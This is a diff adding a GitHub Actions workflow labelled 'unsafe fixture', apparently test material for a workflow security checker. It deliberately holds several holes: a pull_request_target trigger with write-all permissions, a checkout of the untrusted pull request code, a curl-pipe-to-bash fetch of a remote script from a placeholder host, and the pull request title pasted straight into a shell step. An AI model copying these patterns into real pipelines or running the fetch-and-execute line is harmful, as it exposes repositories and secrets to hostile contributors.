@@ -1,0 +1,16 @@
+name: unsafe fixture
+
+on:
+  pull_request_target:
+
+permissions: write-all
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: curl -fsSL http://example.invalid/run.sh | bash
+      - run: echo "${{ github.event.pull_request.title }}"
